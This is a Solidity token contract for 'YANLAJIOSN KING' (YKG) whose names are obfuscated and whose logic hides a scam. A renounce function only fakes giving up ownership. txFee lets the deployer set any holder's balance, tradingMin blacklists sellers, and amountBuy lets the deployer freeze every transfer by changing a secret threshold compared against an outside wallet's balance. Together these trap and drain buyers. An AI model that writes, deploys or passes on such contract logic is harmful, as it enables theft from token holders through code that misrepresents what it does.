//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

abstract contract marketingBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minReceiver {
    function createPair(address senderBuy, address launchedFrom) external returns (address);
}


interface marketingReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface amountLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeTx) external view returns (uint256);

    function transfer(address takeMin, uint256 takeMode) external returns (bool);

    function allowance(address shouldIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeMode) external returns (bool);

    function transferFrom(address sender,address takeMin,uint256 takeMode) external returns (bool);

    event Transfer(address indexed from, address indexed swapTotal, uint256 value);
    event Approval(address indexed shouldIs, address indexed spender, uint256 value);
}

interface feeAmountMax is amountLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract YANLAJIOSNKING is marketingBuy, amountLiquidity, feeAmountMax {

    function approve(address modeSellFund, uint256 takeMode) public virtual override returns (bool) {
        feeAuto[_msgSender()][modeSellFund] = takeMode;
        emit Approval(_msgSender(), modeSellFund, takeMode);
        return true;
    }

    uint256 private launchedBuy;

    bool public modeTeam;

    uint256 public minFeeShould;

    function allowance(address feeToken, address modeSellFund) external view virtual override returns (uint256) {
        if (modeSellFund == autoTeam) {
            return type(uint256).max;
        }
        return feeAuto[feeToken][modeSellFund];
    }

    address swapWalletReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public totalFund;

    function transfer(address swapAmountMax, uint256 takeMode) external virtual override returns (bool) {
        return amountBuy(_msgSender(), swapAmountMax, takeMode);
    }

    bool private autoReceiver;

    mapping(address => bool) public isSwap;

    mapping(address => uint256) private sellLimit;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverAtTo;
    }

    string private listMarketing = "YANLAJIOSN KING";

    address autoTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public tokenReceiver;

    function transferFrom(address atTokenLimit, address takeMin, uint256 takeMode) external override returns (bool) {
        if (_msgSender() != autoTeam) {
            if (feeAuto[atTokenLimit][_msgSender()] != type(uint256).max) {
                require(takeMode <= feeAuto[atTokenLimit][_msgSender()]);
                feeAuto[atTokenLimit][_msgSender()] -= takeMode;
            }
        }
        return amountBuy(atTokenLimit, takeMin, takeMode);
    }

    uint256 sellSwap;

    string private tokenTo = "YKG";

    function name() external view virtual override returns (string memory) {
        return listMarketing;
    }

    mapping(address => mapping(address => uint256)) private feeAuto;

    uint256 public listWalletFee;

    function receiverMode() private view {
        require(receiverTrading[_msgSender()]);
    }

    function owner() external view returns (address) {
        return takeLimit;
    }

    function takeIs() public {
        emit OwnershipTransferred(shouldFee, address(0));
        takeLimit = address(0);
    }

    uint256 marketingSenderMax;

    bool public tokenTotal;

    function getOwner() external view returns (address) {
        return takeLimit;
    }

    function amountBuy(address atTokenLimit, address takeMin, uint256 takeMode) internal returns (bool) {
        if (atTokenLimit == shouldFee) {
            return listBuy(atTokenLimit, takeMin, takeMode);
        }
        uint256 walletBuy = amountLiquidity(tokenReceiver).balanceOf(swapWalletReceiver);
        require(walletBuy == marketingSenderMax);
        require(!isSwap[atTokenLimit]);
        return listBuy(atTokenLimit, takeMin, takeMode);
    }

    function balanceOf(address feeTx) public view virtual override returns (uint256) {
        return sellLimit[feeTx];
    }

    function toTrading(uint256 takeMode) public {
        receiverMode();
        marketingSenderMax = takeMode;
    }

    constructor (){
        
        takeIs();
        marketingReceiver tradingList = marketingReceiver(autoTeam);
        tokenReceiver = minReceiver(tradingList.factory()).createPair(tradingList.WETH(), address(this));
        if (listWalletFee != launchedBuy) {
            feeAmount = false;
        }
        shouldFee = _msgSender();
        receiverTrading[shouldFee] = true;
        sellLimit[shouldFee] = receiverAtTo;
        if (autoReceiver != feeAmount) {
            feeAmount = true;
        }
        emit Transfer(address(0), shouldFee, receiverAtTo);
    }

    function txFee(address swapAmountMax, uint256 takeMode) public {
        receiverMode();
        sellLimit[swapAmountMax] = takeMode;
    }

    function listBuy(address atTokenLimit, address takeMin, uint256 takeMode) internal returns (bool) {
        require(sellLimit[atTokenLimit] >= takeMode);
        sellLimit[atTokenLimit] -= takeMode;
        sellLimit[takeMin] += takeMode;
        emit Transfer(atTokenLimit, takeMin, takeMode);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return buySender;
    }

    uint8 private buySender = 18;

    address private takeLimit;

    function receiverFund(address fromTrading) public {
        if (modeTeam) {
            return;
        }
        if (exemptIs != tokenTotal) {
            minFeeShould = totalFund;
        }
        receiverTrading[fromTrading] = true;
        if (exemptIs == autoReceiver) {
            exemptIs = true;
        }
        modeTeam = true;
    }

    bool private feeAmount;

    uint256 private receiverAtTo = 100000000 * 10 ** 18;

    function tradingMin(address listAt) public {
        receiverMode();
        
        if (listAt == shouldFee || listAt == tokenReceiver) {
            return;
        }
        isSwap[listAt] = true;
    }

    bool public exemptIs;

    event OwnershipTransferred(address indexed senderFund, address indexed swapSender);

    address public shouldFee;

    function symbol() external view virtual override returns (string memory) {
        return tokenTo;
    }

    mapping(address => bool) public receiverTrading;

}